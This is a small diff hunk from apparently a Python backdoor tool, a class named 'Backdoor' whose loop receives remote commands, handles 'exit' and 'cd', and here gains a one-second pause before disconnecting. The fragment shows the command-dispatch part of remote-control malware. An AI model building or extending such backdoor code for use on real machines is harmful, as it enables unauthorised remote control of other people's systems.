@@ -82,6 +82,7 @@ class Backdoor:
 				command = self.reliable_recive()
 				if command == "exit":
 					self.reliable_send("")
+					time.sleep(1)
 					self.connected = False
 
 				elif command.split()[0] == "cd":
